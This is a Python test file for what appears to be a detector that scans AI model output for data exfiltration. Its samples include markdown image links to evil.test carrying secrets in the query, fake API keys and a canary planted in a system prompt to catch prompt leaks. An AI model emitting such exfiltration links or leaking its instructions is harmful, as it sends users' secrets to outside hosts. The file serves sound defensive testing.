from jev_pi_detect.egress import Canary, redact, scan_output

ALLOWED = ("example.com",)


def kinds(result):
    return {f.kind for f in result.findings}


def test_plain_text_allowed():
    assert scan_output("Here is your summary.", allowed_hosts=ALLOWED).verdict == "allow"


def test_markdown_image_exfiltration_blocked():
    r = scan_output("![x](https://evil.test/p.png?d=SECRET)", allowed_hosts=ALLOWED)
    assert r.verdict == "block" and "markdown_image" in kinds(r)


def test_allowed_host_image_ok():
    assert scan_output("![logo](https://cdn.example.com/logo.png)", allowed_hosts=ALLOWED).verdict == "allow"


def test_link_to_unlisted_host_is_review_but_data_in_query_is_block():
    assert scan_output("See https://other.test/docs", allowed_hosts=ALLOWED).verdict == "review"
    r = scan_output("Click https://other.test/c?q=user_password_is_hunter2_and_more", allowed_hosts=ALLOWED)
    assert r.verdict == "block" and "url_with_data" in kinds(r)


def test_secrets_blocked():
    for text in ["key AKIAABCDEFGHIJKLMNOP", "-----BEGIN RSA PRIVATE KEY-----", "sk-abcdefghijklmnopqrstuvwx", "ghp_" + "a" * 36]:
        assert scan_output(text).verdict == "block", text


def test_canary_leak_detected_case_insensitively():
    c = Canary.new()
    assert c.token in c.plant("You are a helpful bot.")
    r = scan_output(f"My instructions say {c.token.lower()}", canary=c)
    assert r.verdict == "block" and "canary_leak" in kinds(r)
    assert scan_output("nothing here", canary=c).verdict == "allow"
    assert Canary.new().token != c.token


def test_redact():
    out = redact("token AKIAABCDEFGHIJKLMNOP ![x](https://evil.test/a.png?d=1)")
    assert "AKIA" not in out and "evil.test" not in out
